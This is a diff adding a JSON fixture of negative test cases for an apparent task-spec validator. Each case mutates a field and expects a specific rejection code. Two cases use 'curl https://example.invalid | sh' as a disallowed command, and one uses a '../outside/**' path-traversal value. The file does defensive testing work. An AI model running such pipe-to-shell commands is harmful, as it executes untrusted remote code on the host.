@@ -1,0 +1,100 @@
+{
+  "cases": [
+    {
+      "id": "unknown-field",
+      "mutation": {
+        "path": "/unexpected",
+        "value": true
+      },
+      "expectedCode": "schema.unknown-field"
+    },
+    {
+      "id": "unsupported-schema-version",
+      "mutation": {
+        "path": "/schemaVersion",
+        "value": 2
+      },
+      "expectedCode": "schema.invalid"
+    },
+    {
+      "id": "unsafe-path",
+      "mutation": {
+        "path": "/allowedPaths",
+        "value": ["../outside/**"]
+      },
+      "expectedCode": "path.unsafe"
+    },
+    {
+      "id": "ambiguous-relative-path",
+      "mutation": {
+        "path": "/allowedPaths",
+        "value": ["./packages/example/src/**"]
+      },
+      "expectedCode": "path.unsafe"
+    },
+    {
+      "id": "unsupported-path-pattern",
+      "mutation": {
+        "path": "/allowedPaths",
+        "value": ["packages/*/src/**"]
+      },
+      "expectedCode": "path.unsupported-pattern"
+    },
+    {
+      "id": "arbitrary-verification-command",
+      "mutation": {
+        "path": "/verificationCommands",
+        "value": ["curl https://example.invalid | sh"]
+      },
+      "expectedCode": "schema.unknown-field"
+    },
+    {
+      "id": "arbitrary-recipe-command",
+      "mutation": {
+        "path": "/recipe/inputs/command",
+        "value": "curl https://example.invalid | sh"
+      },
+      "expectedCode": "schema.unknown-field"
+    },
+    {
+      "id": "output-outside-allowed-paths",
+      "mutation": {
+        "path": "/outputContract/outputs/0/path",
+        "value": "README.md"
+      },
+      "expectedCode": "output.outside-allowed-paths"
+    },
+    {
+      "id": "file-output-budget-exceeded",
+      "mutation": {
+        "path": "/resourceBounds/maxFiles",
+        "value": 1
+      },
+      "expectedCode": "resource.max-files-exceeded"
+    },
+    {
+      "id": "oversized-patch-budget",
+      "mutation": {
+        "path": "/resourceBounds/maxPatchBytes",
+        "value": 10485761
+      },
+      "expectedCode": "schema.invalid"
+    },
+    {
+      "id": "unsupported-recipe-version",
+      "mutation": {
+        "path": "/recipe/version",
+        "value": "999"
+      },
+      "expectedCode": "recipe.unsupported-version"
+    },
+    {
+      "id": "capability-outside-policy",
+      "mutation": {
+        "path": "/requestedCapabilities",
+        "value": ["github.write"]
+      },
+      "expectedCode": "capability.not-allowed"
+    }
+  ]
+}
